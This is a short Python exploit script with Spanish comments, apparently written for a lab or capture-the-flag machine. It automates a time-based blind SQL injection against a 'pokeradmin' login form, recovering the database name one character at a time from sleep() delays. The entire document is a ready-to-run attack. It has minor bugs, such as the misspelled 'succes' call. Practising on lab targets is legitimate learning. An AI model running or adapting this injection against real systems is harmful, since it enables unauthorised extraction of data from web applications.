#!/usr/bin/python3 

import requests
from pwn import * 
import signal 
import sys 
import time 
import string

def def_handler(sig, frame):
    print("\n\[!] Saliendo...\n ")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

#Variables globales 
main_url = "http://192.168.0.26/pokeradmin/index.php"
characters = string.ascii_lowercase + string.digits + ":,_-."

def sqli():

    data = ""

    p1 = log.progress("inyeccion SQLI")
    p1.status("Iniciando proceso de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    for position in range(1, 12):
        for character in characters:
            
            post_data  = {
                'op': 'adminlogin',
                'username': "admin' and if (substr(database(),%d,1)='%s',sleep(0.8),1)-- -" % (position, character),
                'password' : 'admin'
            }
            p1.status(post_data['username'])
            time_start = time.time()
            r = requests.post(main_url, data=post_data, headers=headers)
            time_end = time.time()

            if time_end - time_start > 0.85:
                data += character
                p2.status(data)
                break
    p1.succes('Se ha completado la inyeccion SQL')
    p2.succes(data)
if  __name__ == '__main__':

    sqli()